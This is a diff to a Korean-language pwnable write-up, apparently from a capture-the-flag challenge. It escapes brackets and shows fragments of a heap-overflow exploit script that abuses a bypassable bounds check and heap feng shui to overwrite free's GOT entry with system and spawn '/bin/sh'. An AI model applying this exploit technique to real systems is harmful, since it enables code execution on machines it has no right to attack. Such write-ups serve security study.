@@ -116,7 +116,7 @@ return userInfo;
 
 ### DeleteAUser
 
-- a1을 인자로 전달받아 *(void )gUserList[a1](desc)와 gUserList[a1]을 free 후 0 저장
+- a1을 인자로 전달받아 *(void )gUserList\[a1\](desc)와 gUserList\[a1\]을 free 후 0 저장
 
 ```
 unsigned int __cdecl DeleteAUser(unsigned __int8 a1)
@@ -153,8 +153,8 @@ return __readgsdword(0x14u) ^ v2;
 
 ### UpdateAUserDescription
 
-- a1이 gCnt보다 작고 gUserList[a1]이 0이 아닌지 체크
-- text_length를 입력받고 “&gUserList[a1]->desc[textLength]”의 주소가 “gUserList[a1] - 4” 보다 큰지 체크
+- a1이 gCnt보다 작고 gUserList\[a1\]이 0이 아닌지 체크
+- text_length를 입력받고 "&gUserList\[a1\]->desc\[textLength\]"의 주소가 "gUserList\[a1\] - 4" 보다 큰지 체크
 - desc 영역에 입력할 값이 userInfo 영역을 침범하는지 확인하는 바운더리 체크
 
 ```
@@ -183,7 +183,7 @@ return __readgsdword(0x14u) ^ v4;
 
 ### Vulnerabilities
 
-순차적으로 description, userinfo 영역이 할당된다. 하지만 처음 등록된 유저를 삭제할 경우 할당된 heap 영역이 해제되어 fastbin[0], unsortedbin(136) 공간이 생성되고, 새로운 유저 등록 시 description의 영역으로 unsortedbin(136) 영역 할당한다. 해당 계정이 할당받은 description 영역과, User *userInfo 영역 사이 다른 계정 정보가 위치하게 된다. 이로 인해 heap feng shui가 뜻하는 heap 레이아웃을 활용하여 exploit 가능하다.
+순차적으로 description, userinfo 영역이 할당된다. 하지만 처음 등록된 유저를 삭제할 경우 할당된 heap 영역이 해제되어 fastbin\[0\], unsortedbin(136) 공간이 생성되고, 새로운 유저 등록 시 description의 영역으로 unsortedbin(136) 영역 할당한다. 해당 계정이 할당받은 description 영역과, User *userInfo 영역 사이 다른 계정 정보가 위치하게 된다. 이로 인해 heap feng shui가 뜻하는 heap 레이아웃을 활용하여 exploit 가능하다.
 
 “text_length”의 값으로 유저 생성 시 입력했던 Description 영역의 크기보다 큰 값을 입력하여 조건문 통과 가능하며, 조건문을 우회함으로써 heap overflow도 가능하다.
 
@@ -233,7 +233,7 @@ add_user('10','AAAA','/bin/sh') # 2
 
 delete_user('0')
 
-# Overflow user[1]'s desc
+# Overflow user\[1\]'s desc
 # free got : 0x0804b010 
 add_user('124','Heap Overflow','D'*0x98+'\x10\xb0\x04\x08')
 
@@ -249,7 +249,7 @@ log.info('libc base : ' + hex(libc_base))
 log.info('free addr : ' + hex(free_addr))
 log.info('system addr : ' + hex(system_addr))
 
-# Overwrite user[1]'s desc(free_got) to system addr
+# Overwrite user\[1\]'s desc(free_got) to system addr
 update_user('1',p32(system_addr))
 
 # system('/bin/sh')
